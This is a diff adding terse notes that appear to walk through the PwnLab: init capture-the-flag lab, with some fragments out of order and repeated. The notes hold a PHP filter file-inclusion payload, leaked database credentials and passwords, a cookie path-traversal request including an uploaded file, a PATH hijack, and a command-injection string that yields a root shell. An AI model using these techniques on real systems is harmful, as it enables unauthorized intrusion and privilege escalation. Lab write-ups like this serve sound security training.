@@ -1,0 +1,200 @@
+─$ nmap -A -p 80,111,3306,60675 192.168.56.155
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 22:22 PDT
+Nmap scan report for 192.168.56.155
+Host is up (0.00049s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: PwnLab Intranet Image Hosting
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          47790/udp   status
+|   100024  1          49231/tcp6  status
+|   100024  1          54001/udp6  status
+|_  100024  1          60675/tcp   status
+3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.47-0+deb8u1
+|   Thread ID: 42
+|   Capabilities flags: 63487
+|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, LongPassword, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: ZG7y~-c,O)}\7:_OO|Cw
+|_  Auth Plugin Name: mysql_native_password
+60675/tcp open  status  1 (RPC #100024)
+
+//this is a vuln of php
+http://192.168.56.155/?page=php://filter/convert.base64-encode/resource=config
+
+PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+
+<?php
+$server	  = "localhost";
+$username = "root";
+$password = "H4u%QJ_H99";
+$database = "Users";
+?>  
+//seems mysql account
+
+MySQL [Users]> select * from users;
++------+------------------+
+| user | pass             |
++------+------------------+
+| kent | Sld6WHVCSkpOeQ== | JWzXuBJJNy
+| mike | U0lmZHNURW42SQ== | SIfdsTEn6I
+| kane | aVN2NVltMkdSbw== | iSv5Ym2GRo
++------+------------------+
+
+http://192.168.56.155/?page=php://filter/convert.base64-encode/resource=index
+<?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+	include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br />
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr/><br/>
+<?php
+	if (isset($_GET['page']))
+	{
+		include($_GET['page'].".php");
+	}
+	else
+	{
+		echo "Use this server to upload and share image files inside the intranet";
+	}
+?>
+</center>
+</body>
+</html>
+
+
+//what uploaded is 	f2f51d5550f38447c2850b0bc249b233.gif	
+//in burp, mondified cookie to lang= xxxx
+GET / /HTTP/1.1
+Host: 192.168.56.155
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://192.168.56.155/?page=upload
+Accept-Encoding: gzip, deflate, br
+Cookie: lang=../upload/f2f51d5550f38447c2850b0bc249b233.gif
+Connection: keep-alive
+
+mike@pwnlab:/home/mike$ ./msg2root 
+./msg2root 
+Message for root: test && /bin/sh  
+test && /bin/sh 
+test
+# id
+id
+uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
+
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://192.168.56.155/?page=upload
+Accept-Encoding: gzip, deflate, br
+Cookie: lang=../upload/f2f51d5550f38447c2850b0bc249b233.gif
+Connection: keep-alive
+
+
+
+su kane
+
+kane@pwnlab:~$ ./msgmike
+./msgmike
+cat: /home/mike/msg.txt: No such file or directory
+
+kane@pwnlab:~$ cd /tmp
+cd /tmp
+kane@pwnlab:/tmp$ echo "/bin/bash" > cat
+echo "/bin/bash" > cat
+
+kane@pwnlab:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+kane@pwnlab:/tmp$ chmod +x cat
+chmod +x cat
+kane@pwnlab:/tmp$ cd ~
+cd ~
+kane@pwnlab:~$ ls
+ls
+msgmike
+kane@pwnlab:~$ ./msgmike
+./msgmike
+mike@pwnlab:~$ id
+id
+uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
+
+mike@pwnlab:/home/mike$ ls
+ls
+msg2root
+mike@pwnlab:/home/mike$ strings msgroot
+strings msgroot
+strings: 'msgroot': No such file
+mike@pwnlab:/home/mike$ strings msg2root
+strings msg2root
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+stdin
+fgets
+asprintf
+system
+__libc_start_main
+__gmon_start__
+GLIBC_2.0
+PTRh
+[^_]
+Message for root: 
+/bin/echo %s >> /root/messages.txt
+
+mike@pwnlab:/home/mike$ ./msg2root 
+./msg2root 
+Message for root: test && /bin/sh  
+test && /bin/sh 
+test
+# id
+id
+uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
+
+
+more flag.txt
+.-=~=-.                                                                 .-=~=-.
+(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+(_ ___)  _____                             _                            (_ ___)
+(__  _) /  __ \                           | |                           (__  _)
+( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+( _ __)                     __/ |                                       ( _ __)
+(__  _)                    |___/                                        (__  _)
+(__  _)                                                                 (__  _)
+(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+`-._.-'                                                                 `-._.-'
